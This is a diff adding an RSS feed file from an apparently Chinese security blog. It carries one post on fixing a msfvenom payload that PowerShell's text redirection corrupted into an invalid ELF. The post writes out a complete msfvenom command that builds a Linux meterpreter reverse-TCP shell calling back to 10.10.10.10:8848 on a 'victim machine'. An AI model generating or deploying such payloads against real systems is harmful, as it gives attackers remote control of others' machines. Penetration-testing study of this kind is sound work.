@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>MSF on Byebyedoggy</title>
+        <link>https://byebydoggy.github.io/categories/msf/</link>
+        <description>Recent content in MSF on Byebyedoggy</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sun, 07 Dec 2025 15:18:37 +0800</lastBuildDate><atom:link href="https://byebydoggy.github.io/categories/msf/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>1207 Msfvenom踩坑</title>
+        <link>https://byebydoggy.github.io/post/2025/1207-msfvenom%E8%B8%A9%E5%9D%91/</link>
+        <pubDate>Sun, 07 Dec 2025 15:18:37 +0800</pubDate>
+        
+        <guid>https://byebydoggy.github.io/post/2025/1207-msfvenom%E8%B8%A9%E5%9D%91/</guid>
+        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 1207 Msfvenom踩坑" /&gt;&lt;h1 id=&#34;问题&#34;&gt;问题
+&lt;/h1&gt;&lt;p&gt;在Jiaosu powershell下生成的payload文件传递给受害机后发现始终无法联通，查看payload文件发现为data类型(file payload)&lt;/p&gt;
+&lt;h1 id=&#34;原因&#34;&gt;原因
+&lt;/h1&gt;&lt;p&gt;来自豆包&lt;/p&gt;
+&lt;p&gt;从 &lt;code&gt;msfvenom&lt;/code&gt; 生成 ELF 文件却识别为 &lt;code&gt;data&lt;/code&gt;、无法执行的核心原因，是 &lt;strong&gt;Windows PowerShell 重定向输出时的编码 / 格式污染&lt;/strong&gt; （而非文件完整性 / 架构问题）——PowerShell 的 &lt;code&gt;&amp;gt;&lt;/code&gt; 重定向默认会以「文本模式」处理输出，破坏 ELF 二进制文件的原始字节结构，导致文件变成无效的 &lt;code&gt;data&lt;/code&gt; 格式。&lt;/p&gt;
+&lt;h3 id=&#34;一根本原因powershell-文本重定向污染二进制文件&#34;&gt;一、根本原因：PowerShell 文本重定向污染二进制文件
+&lt;/h3&gt;&lt;p&gt;Linux 的 ELF 是纯二进制格式，而 Windows PowerShell 的 &lt;code&gt;&amp;gt;&lt;/code&gt; 本质是 &lt;code&gt;Out-File&lt;/code&gt; 命令，默认：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;采用 &lt;code&gt;Unicode/UTF-16&lt;/code&gt; 编码（而非二进制）；&lt;/li&gt;
+&lt;li&gt;会自动转换换行符（&lt;code&gt;\n&lt;/code&gt;→&lt;code&gt;\r\n&lt;/code&gt;）、添加 BOM 头；&lt;/li&gt;
+&lt;li&gt;截断 / 修改非文本字节，直接破坏 ELF 文件的魔数（&lt;code&gt;0x7f 45 4c 46&lt;/code&gt;）和结构。
+即便 SHA 值 “一致”，也可能是你在 Windows 本地校验的是被污染后的文件，而非传输到 Linux 后的版本。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;解决办法&#34;&gt;解决办法
+&lt;/h1&gt;&lt;h4 id=&#34;直接在-linux-环境生成推荐无格式问题&#34;&gt;直接在 Linux 环境生成（推荐，无格式问题）
+&lt;/h4&gt;&lt;h4 id=&#34;windows-下用-cmdexe-替代-powershell-生成&#34;&gt;Windows 下用 cmd.exe 替代 PowerShell 生成
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 打开cmd.exe（非PowerShell），执行以下命令
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8848 -f elf -o shell_x64.elf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;⚠️ 注意：必须用 &lt;code&gt;-o&lt;/code&gt; 参数（指定输出文件），而非 &lt;code&gt;&amp;gt;&lt;/code&gt; 重定向 ——&lt;code&gt;msfvenom&lt;/code&gt; 的 &lt;code&gt;-o&lt;/code&gt; 本身就是二进制写入，比重定向更可靠。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
